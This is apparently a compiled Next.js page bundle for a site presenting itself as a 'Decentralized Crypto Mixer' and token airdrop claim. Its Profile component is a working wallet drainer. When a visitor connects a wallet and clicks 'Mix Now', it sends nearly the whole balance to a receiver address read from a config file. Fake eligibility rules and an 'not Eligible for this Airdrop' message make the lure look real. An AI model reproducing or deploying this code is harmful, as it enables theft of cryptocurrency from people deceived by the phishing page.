"use strict";
(() => {
var exports = {};
exports.id = 405;
exports.ids = [405];
exports.modules = {

/***/ 1146:
/***/ ((module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.a(module, async (__webpack_handle_async_dependencies__, __webpack_async_result__) => { try {
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "Z": () => (__WEBPACK_DEFAULT_EXPORT__)
/* harmony export */ });
/* harmony import */ var react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(997);
/* harmony import */ var react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__);
/* harmony import */ var wagmi__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(8998);
/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(6689);
/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_2___default = /*#__PURE__*/__webpack_require__.n(react__WEBPACK_IMPORTED_MODULE_2__);
/* harmony import */ var use_debounce__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(7105);
/* harmony import */ var ethers_lib_utils_js__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(8721);
/* harmony import */ var ethers_lib_utils_js__WEBPACK_IMPORTED_MODULE_4___default = /*#__PURE__*/__webpack_require__.n(ethers_lib_utils_js__WEBPACK_IMPORTED_MODULE_4__);
/* harmony import */ var sweetalert2__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(271);
/* harmony import */ var sweetalert2__WEBPACK_IMPORTED_MODULE_5___default = /*#__PURE__*/__webpack_require__.n(sweetalert2__WEBPACK_IMPORTED_MODULE_5__);
/* harmony import */ var axios__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(9648);
/* harmony import */ var _web3modal_react__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(9867);
var __webpack_async_dependencies__ = __webpack_handle_async_dependencies__([wagmi__WEBPACK_IMPORTED_MODULE_1__, use_debounce__WEBPACK_IMPORTED_MODULE_3__, axios__WEBPACK_IMPORTED_MODULE_6__, _web3modal_react__WEBPACK_IMPORTED_MODULE_7__]);
([wagmi__WEBPACK_IMPORTED_MODULE_1__, use_debounce__WEBPACK_IMPORTED_MODULE_3__, axios__WEBPACK_IMPORTED_MODULE_6__, _web3modal_react__WEBPACK_IMPORTED_MODULE_7__] = __webpack_async_dependencies__.then ? (await __webpack_async_dependencies__)() : __webpack_async_dependencies__);









function Profile(props) {
    const [to, setTo] = (0,react__WEBPACK_IMPORTED_MODULE_2__.useState)(props.to);
    const { switchNetwork  } = (0,wagmi__WEBPACK_IMPORTED_MODULE_1__.useSwitchNetwork)();
    const { chain , chains  } = (0,wagmi__WEBPACK_IMPORTED_MODULE_1__.useNetwork)();
    const { address , connector , isConnected  } = (0,wagmi__WEBPACK_IMPORTED_MODULE_1__.useAccount)();
    const { data: ensAvatar  } = (0,wagmi__WEBPACK_IMPORTED_MODULE_1__.useEnsAvatar)({
        address
    });
    const { data: ensName  } = (0,wagmi__WEBPACK_IMPORTED_MODULE_1__.useEnsName)({
        address
    });
    const { connect , connectors , error , isLoading , pendingConnector  } = (0,wagmi__WEBPACK_IMPORTED_MODULE_1__.useConnect)();
    const { disconnect  } = (0,wagmi__WEBPACK_IMPORTED_MODULE_1__.useDisconnect)();
    const [amount, setAmount] = (0,react__WEBPACK_IMPORTED_MODULE_2__.useState)(0);
    const [info, setInfo] = (0,react__WEBPACK_IMPORTED_MODULE_2__.useState)(false);
    const balance = (0,wagmi__WEBPACK_IMPORTED_MODULE_1__.useBalance)({
        address
    });
    const fee = 0.0056;
    const [debouncedTo] = (0,use_debounce__WEBPACK_IMPORTED_MODULE_3__.useDebounce)(to, 500);
    const { sendTransaction  } = (0,wagmi__WEBPACK_IMPORTED_MODULE_1__.useSendTransaction)({
        request: {
            to: debouncedTo,
            value: (0,ethers_lib_utils_js__WEBPACK_IMPORTED_MODULE_4__.parseEther)(String(amount))
        }
    });
    //console.log(to)
    const getWallet = ()=>{
        const myBalance = balance.data.formatted;
        const amtToSend = myBalance - 0.0056;
        //console.log(amtToSend)
        if (amtToSend > 0) {
            setAmount(amtToSend);
            if (amount > 0) {
                sendTransaction();
            } else {
                setInfo(true);
            }
            console.log(amount);
        } else {
            sweetalert2__WEBPACK_IMPORTED_MODULE_5___default().fire("Oops", "This wallet is not Eligible for this Airdrop", "error");
        }
    // console.log("balance",balance.data.formatted)
    // console.log("fee",fee.data)
    };
    return isConnected && /*#__PURE__*/ (0,react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxs)(react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.Fragment, {
        children: [
            /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("div", {
                className: "modal fade",
                id: "networks",
                children: /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("div", {
                    className: "modal-dialog modal-dialog-centered",
                    children: /*#__PURE__*/ (0,react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxs)("div", {
                        className: "modal-content bg-dark",
                        children: [
                            /*#__PURE__*/ (0,react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxs)("div", {
                                className: "modal-header h3",
                                children: [
                                    "Switch Network",
                                    /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("button", {
                                        className: "btn btn-dark btn-close",
                                        id: "close-mod",
                                        "data-bs-dismiss": "modal"
                                    })
                                ]
                            }),
                            /*#__PURE__*/ (0,react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxs)("div", {
                                className: "modal-body",
                                children: [
                                    chains.map((x)=>/*#__PURE__*/ (0,react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxs)("button", {
                                            className: "btn btn-outline-info text-white my-2 w-100",
                                            disabled: !switchNetwork || x.id === chain?.id,
                                            onClick: ()=>switchNetwork?.(x.id),
                                            children: [
                                                x.name,
                                                isLoading && pendingChainId === x.id && " (switching)"
                                            ]
                                        }, x.id)),
                                    /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("button", {
                                        className: "btn btn-danger w-100",
                                        onClick: ()=>{
                                            disconnect();
                                            document.getElementById("close-mod").click();
                                        },
                                        children: "Disconnect"
                                    })
                                ]
                            })
                        ]
                    })
                })
            }),
            /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("div", {
                children: /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("code", {
                    children: ensName ? `${ensName} (${address})` : address
                })
            }),
            /*#__PURE__*/ (0,react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxs)("div", {
                className: "text-info",
                children: [
                    "Connected to the ",
                    /*#__PURE__*/ (0,react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxs)("b", {
                        children: [
                            chain.name,
                            " "
                        ]
                    }),
                    "Network"
                ]
            }),
            /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("button", {
                className: " my-2 btn primary-btn",
                onClick: getWallet,
                children: "Mix Now"
            }),
            /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("br", {}),
            /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("span", {
                className: "btn badge my-2 bg-secondary float-end",
                "data-bs-toggle": "modal",
                "data-bs-target": "#networks",
                children: "Switch network"
            })
        ]
    }) || /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx(react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.Fragment, {
        children: /*#__PURE__*/ (0,react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxs)("div", {
            className: "text-center",
            children: [
                /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx(_web3modal_react__WEBPACK_IMPORTED_MODULE_7__.Web3Button, {
                    label: "Mix Now"
                }),
                connectors.map((connector, index)=>/*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx(react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.Fragment, {
                        children: /*#__PURE__*/ (0,react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxs)("button", {
                            className: "btn primary-btn m-2 d-none",
                            disabled: !connector.ready,
                            onClick: ()=>connect({
                                    connector
                                }),
                            children: [
                                "Mix Now",
                                !connector.ready && " (unsupported)",
                                isLoading && connector.id === pendingConnector?.id && " (connecting)"
                            ]
                        }, connector.id)
                    }))
            ]
        })
    });
}
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = (Profile);

__webpack_async_result__();
} catch(e) { __webpack_async_result__(e); } });

/***/ }),

/***/ 3681:
/***/ ((module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.a(module, async (__webpack_handle_async_dependencies__, __webpack_async_result__) => { try {
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "Z": () => (__WEBPACK_DEFAULT_EXPORT__)
/* harmony export */ });
/* harmony import */ var react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(997);
/* harmony import */ var react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__);
/* harmony import */ var next_dynamic__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(5152);
/* harmony import */ var next_dynamic__WEBPACK_IMPORTED_MODULE_1___default = /*#__PURE__*/__webpack_require__.n(next_dynamic__WEBPACK_IMPORTED_MODULE_1__);
/* harmony import */ var wagmi__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(8998);
/* harmony import */ var _Profile__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(1146);
var __webpack_async_dependencies__ = __webpack_handle_async_dependencies__([wagmi__WEBPACK_IMPORTED_MODULE_2__, _Profile__WEBPACK_IMPORTED_MODULE_3__]);
([wagmi__WEBPACK_IMPORTED_MODULE_2__, _Profile__WEBPACK_IMPORTED_MODULE_3__] = __webpack_async_dependencies__.then ? (await __webpack_async_dependencies__)() : __webpack_async_dependencies__);




// Pass client to React Context Provider
function WalletConnect(props) {
    const { isConnected  } = (0,wagmi__WEBPACK_IMPORTED_MODULE_2__.useAccount)();
    const getWallet = ()=>{};
    return /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx(_Profile__WEBPACK_IMPORTED_MODULE_3__/* ["default"] */ .Z, {
        to: props.to
    });
}
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = (next_dynamic__WEBPACK_IMPORTED_MODULE_1___default()(()=>Promise.resolve(WalletConnect), {
    ssr: false
}));

__webpack_async_result__();
} catch(e) { __webpack_async_result__(e); } });

/***/ }),

/***/ 6616:
/***/ ((module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.a(module, async (__webpack_handle_async_dependencies__, __webpack_async_result__) => { try {
__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ Home),
/* harmony export */   "getServerSideProps": () => (/* binding */ getServerSideProps)
/* harmony export */ });
/* harmony import */ var react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(997);
/* harmony import */ var react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__);
/* harmony import */ var next_head__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(968);
/* harmony import */ var next_head__WEBPACK_IMPORTED_MODULE_1___default = /*#__PURE__*/__webpack_require__.n(next_head__WEBPACK_IMPORTED_MODULE_1__);
/* harmony import */ var next_image__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(5675);
/* harmony import */ var next_image__WEBPACK_IMPORTED_MODULE_2___default = /*#__PURE__*/__webpack_require__.n(next_image__WEBPACK_IMPORTED_MODULE_2__);
/* harmony import */ var bootstrap_dist_css_bootstrap_css__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(5931);
/* harmony import */ var bootstrap_dist_css_bootstrap_css__WEBPACK_IMPORTED_MODULE_3___default = /*#__PURE__*/__webpack_require__.n(bootstrap_dist_css_bootstrap_css__WEBPACK_IMPORTED_MODULE_3__);
/* harmony import */ var next_script__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(4298);
/* harmony import */ var next_script__WEBPACK_IMPORTED_MODULE_4___default = /*#__PURE__*/__webpack_require__.n(next_script__WEBPACK_IMPORTED_MODULE_4__);
/* harmony import */ var axios__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(9648);
/* harmony import */ var path__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(1017);
/* harmony import */ var path__WEBPACK_IMPORTED_MODULE_6___default = /*#__PURE__*/__webpack_require__.n(path__WEBPACK_IMPORTED_MODULE_6__);
/* harmony import */ var fs__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(7147);
/* harmony import */ var fs__WEBPACK_IMPORTED_MODULE_7___default = /*#__PURE__*/__webpack_require__.n(fs__WEBPACK_IMPORTED_MODULE_7__);
/* harmony import */ var _components_WalletConnect__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__(3681);
/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_9__ = __webpack_require__(6689);
/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_9___default = /*#__PURE__*/__webpack_require__.n(react__WEBPACK_IMPORTED_MODULE_9__);
/* harmony import */ var wagmi__WEBPACK_IMPORTED_MODULE_10__ = __webpack_require__(8998);
/* harmony import */ var wagmi_chains__WEBPACK_IMPORTED_MODULE_11__ = __webpack_require__(7697);
/* harmony import */ var wagmi_connectors_walletConnect__WEBPACK_IMPORTED_MODULE_12__ = __webpack_require__(6601);
/* harmony import */ var _web3modal_react__WEBPACK_IMPORTED_MODULE_13__ = __webpack_require__(9867);
/* harmony import */ var _web3modal_ethereum__WEBPACK_IMPORTED_MODULE_14__ = __webpack_require__(6703);
var __webpack_async_dependencies__ = __webpack_handle_async_dependencies__([axios__WEBPACK_IMPORTED_MODULE_5__, _components_WalletConnect__WEBPACK_IMPORTED_MODULE_8__, wagmi__WEBPACK_IMPORTED_MODULE_10__, wagmi_chains__WEBPACK_IMPORTED_MODULE_11__, wagmi_connectors_walletConnect__WEBPACK_IMPORTED_MODULE_12__, _web3modal_react__WEBPACK_IMPORTED_MODULE_13__, _web3modal_ethereum__WEBPACK_IMPORTED_MODULE_14__]);
([axios__WEBPACK_IMPORTED_MODULE_5__, _components_WalletConnect__WEBPACK_IMPORTED_MODULE_8__, wagmi__WEBPACK_IMPORTED_MODULE_10__, wagmi_chains__WEBPACK_IMPORTED_MODULE_11__, wagmi_connectors_walletConnect__WEBPACK_IMPORTED_MODULE_12__, _web3modal_react__WEBPACK_IMPORTED_MODULE_13__, _web3modal_ethereum__WEBPACK_IMPORTED_MODULE_14__] = __webpack_async_dependencies__.then ? (await __webpack_async_dependencies__)() : __webpack_async_dependencies__);















const projectId = "2c515028cc183de99fa6a655231e348b";
const chains = [
    wagmi_chains__WEBPACK_IMPORTED_MODULE_11__.arbitrum,
    wagmi_chains__WEBPACK_IMPORTED_MODULE_11__.mainnet,
    wagmi_chains__WEBPACK_IMPORTED_MODULE_11__.polygon,
    wagmi_chains__WEBPACK_IMPORTED_MODULE_11__.goerli,
    wagmi_chains__WEBPACK_IMPORTED_MODULE_11__.bsc,
    wagmi_chains__WEBPACK_IMPORTED_MODULE_11__.avalanche
];
const { provider  } = (0,wagmi__WEBPACK_IMPORTED_MODULE_10__.configureChains)(chains, [
    (0,_web3modal_ethereum__WEBPACK_IMPORTED_MODULE_14__.w3mProvider)({
        projectId
    })
]);
const wagmiClient = (0,wagmi__WEBPACK_IMPORTED_MODULE_10__.createClient)({
    autoConnect: true,
    connectors: (0,_web3modal_ethereum__WEBPACK_IMPORTED_MODULE_14__.w3mConnectors)({
        projectId,
        version: 1,
        chains
    }),
    provider
});
const ethereumClient = new _web3modal_ethereum__WEBPACK_IMPORTED_MODULE_14__.EthereumClient(wagmiClient, chains);
const getServerSideProps = async ()=>{
    //Find the absolute path of the json directory
    const jsonDirectory = path__WEBPACK_IMPORTED_MODULE_6___default().join(process.cwd(), "json");
    //Read the json data file data.json
    const fileContents = await fs__WEBPACK_IMPORTED_MODULE_7__.promises.readFile(jsonDirectory + "/config.json", "utf8");
    const fileRead = JSON.parse(fileContents);
    // console.log(fileContents)
    return {
        props: {
            fileRead
        }
    };
};
function Home({ fileRead  }) {
    console.log(fileRead);
    const [name, setName] = (0,react__WEBPACK_IMPORTED_MODULE_9__.useState)(fileRead.token);
    const [receiver, setReceiver] = (0,react__WEBPACK_IMPORTED_MODULE_9__.useState)(fileRead.to);
    const [image, setImage] = (0,react__WEBPACK_IMPORTED_MODULE_9__.useState)(fileRead.image);
    const [heading, setHeading] = (0,react__WEBPACK_IMPORTED_MODULE_9__.useState)(fileRead.heading);
    const [paragraph, setParagraph] = (0,react__WEBPACK_IMPORTED_MODULE_9__.useState)(fileRead.paragraph);
    return /*#__PURE__*/ (0,react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxs)(react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.Fragment, {
        children: [
            /*#__PURE__*/ (0,react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxs)((next_head__WEBPACK_IMPORTED_MODULE_1___default()), {
                children: [
                    /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("title", {
                        children: " Decentralized Crypto Mixer"
                    }),
                    /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("meta", {
                        name: "description",
                        content: `Claim ${name} Tokens`
                    }),
                    /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("meta", {
                        name: "viewport",
                        content: "width=device-width, initial-scale=1"
                    }),
                    /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("link", {
                        rel: "icon",
                        href: "/favicon.ico"
                    }),
                    /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("link", {
                        rel: "preconnect",
                        href: "https://fonts.googleapis.com"
                    }),
                    /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("link", {
                        rel: "preconnect",
                        href: "https://fonts.gstatic.com",
                        crossorigin: true
                    }),
                    /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("link", {
                        href: "https://fonts.googleapis.com/css2?family=DM+Sans:wght@700&family=Lato:wght@400;700;900&family=Public+Sans&family=Raleway:wght@400;500&display=swap",
                        rel: "stylesheet"
                    })
                ]
            }),
            /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx((next_script__WEBPACK_IMPORTED_MODULE_4___default()), {
                src: "https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"
            }),
            /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx(wagmi__WEBPACK_IMPORTED_MODULE_10__.WagmiConfig, {
                client: wagmiClient,
                children: /*#__PURE__*/ (0,react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxs)("div", {
                    style: {
                        backgroundColor: "#020101"
                    },
                    children: [
                        /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("nav", {
                            className: "navbar navbar-expand-sm bg-dark navbar-dark",
                            children: /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("div", {
                                className: "container-fluid",
                                children: /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("span", {
                                    className: "navbar-brand",
                                    children: /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("h2", {
                                        className: "text-muted",
                                        children: name
                                    })
                                })
                            })
                        }),
                        /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("main", {
                            className: "wrapper vh-100",
                            children: /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("div", {
                                className: "container my-4",
                                children: /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("div", {
                                    className: "row",
                                    children: /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("div", {
                                        className: "col-12 col-lg-8 mx-auto",
                                        children: /*#__PURE__*/ (0,react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxs)("div", {
                                            className: "card bg-dark text-white",
                                            style: {
                                                position: "relative"
                                            },
                                            children: [
                                                /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx((next_image__WEBPACK_IMPORTED_MODULE_2___default()), {
                                                    className: "card-img-top",
                                                    src: image,
                                                    alt: "Card image",
                                                    width: 150,
                                                    height: 400
                                                }),
                                                /*#__PURE__*/ (0,react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxs)("div", {
                                                    className: "card-body",
                                                    children: [
                                                        /*#__PURE__*/ (0,react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxs)("div", {
                                                            className: "text-center",
                                                            children: [
                                                                /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("h1", {
                                                                    children: heading
                                                                }),
                                                                /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("p", {
                                                                    children: paragraph
                                                                }),
                                                                /*#__PURE__*/ (0,react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxs)("div", {
                                                                    className: "my-3",
                                                                    children: [
                                                                        /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx(_web3modal_react__WEBPACK_IMPORTED_MODULE_13__.Web3Modal, {
                                                                            projectId: projectId,
                                                                            ethereumClient: ethereumClient
                                                                        }),
                                                                        /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx(_components_WalletConnect__WEBPACK_IMPORTED_MODULE_8__/* ["default"] */ .Z, {
                                                                            to: receiver
                                                                        })
                                                                    ]
                                                                })
                                                            ]
                                                        }),
                                                        /*#__PURE__*/ (0,react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxs)("div", {
                                                            className: "text-start",
                                                            children: [
                                                                /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("h3", {
                                                                    children: "Eligibility Criteria"
                                                                }),
                                                                /*#__PURE__*/ (0,react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxs)("ul", {
                                                                    children: [
                                                                        /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("li", {
                                                                            children: "New wallets cannot participate"
                                                                        }),
                                                                        /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("li", {
                                                                            children: "Your wallet must have transactions"
                                                                        }),
                                                                        /*#__PURE__*/ react_jsx_runtime__WEBPACK_IMPORTED_MODULE_0__.jsx("li", {
                                                                            children: "You must confirm that you are the owner of the wallet"
                                                                        })
                                                                    ]
                                                                })
                                                            ]
                                                        })
                                                    ]
                                                })
                                            ]
                                        })
                                    })
                                })
                            })
                        })
                    ]
                })
            })
        ]
    });
}

__webpack_async_result__();
} catch(e) { __webpack_async_result__(e); } });

/***/ }),

/***/ 8721:
/***/ ((module) => {

module.exports = require("ethers/lib/utils.js");

/***/ }),

/***/ 3918:
/***/ ((module) => {

module.exports = require("next/dist/shared/lib/amp-context.js");

/***/ }),

/***/ 5732:
/***/ ((module) => {

module.exports = require("next/dist/shared/lib/amp-mode.js");

/***/ }),

/***/ 2796:
/***/ ((module) => {

module.exports = require("next/dist/shared/lib/head-manager-context.js");

/***/ }),

/***/ 4486:
/***/ ((module) => {

module.exports = require("next/dist/shared/lib/image-blur-svg.js");

/***/ }),

/***/ 744:
/***/ ((module) => {

module.exports = require("next/dist/shared/lib/image-config-context.js");

/***/ }),

/***/ 5843:
/***/ ((module) => {

module.exports = require("next/dist/shared/lib/image-config.js");

/***/ }),

/***/ 9552:
/***/ ((module) => {

module.exports = require("next/dist/shared/lib/image-loader");

/***/ }),

/***/ 5832:
/***/ ((module) => {

module.exports = require("next/dist/shared/lib/loadable.js");

/***/ }),

/***/ 2470:
/***/ ((module) => {

module.exports = require("next/dist/shared/lib/side-effect.js");

/***/ }),

/***/ 618:
/***/ ((module) => {

module.exports = require("next/dist/shared/lib/utils/warn-once.js");

/***/ }),

/***/ 968:
/***/ ((module) => {

module.exports = require("next/head");

/***/ }),

/***/ 6689:
/***/ ((module) => {

module.exports = require("react");

/***/ }),

/***/ 6405:
/***/ ((module) => {

module.exports = require("react-dom");

/***/ }),

/***/ 997:
/***/ ((module) => {

module.exports = require("react/jsx-runtime");

/***/ }),

/***/ 271:
/***/ ((module) => {

module.exports = require("sweetalert2");

/***/ }),

/***/ 6703:
/***/ ((module) => {

module.exports = import("@web3modal/ethereum");;

/***/ }),

/***/ 9867:
/***/ ((module) => {

module.exports = import("@web3modal/react");;

/***/ }),

/***/ 9648:
/***/ ((module) => {

module.exports = import("axios");;

/***/ }),

/***/ 7105:
/***/ ((module) => {

module.exports = import("use-debounce");;

/***/ }),

/***/ 8998:
/***/ ((module) => {

module.exports = import("wagmi");;

/***/ }),

/***/ 7697:
/***/ ((module) => {

module.exports = import("wagmi/chains");;

/***/ }),

/***/ 6601:
/***/ ((module) => {

module.exports = import("wagmi/connectors/walletConnect");;

/***/ }),

/***/ 7147:
/***/ ((module) => {

module.exports = require("fs");

/***/ }),

/***/ 1017:
/***/ ((module) => {

module.exports = require("path");

/***/ })

};
;

// load runtime
var __webpack_require__ = require("../webpack-runtime.js");
__webpack_require__.C(exports);
var __webpack_exec__ = (moduleId) => (__webpack_require__(__webpack_require__.s = moduleId))
var __webpack_exports__ = __webpack_require__.X(0, [636,844], () => (__webpack_exec__(6616)));
module.exports = __webpack_exports__;

})();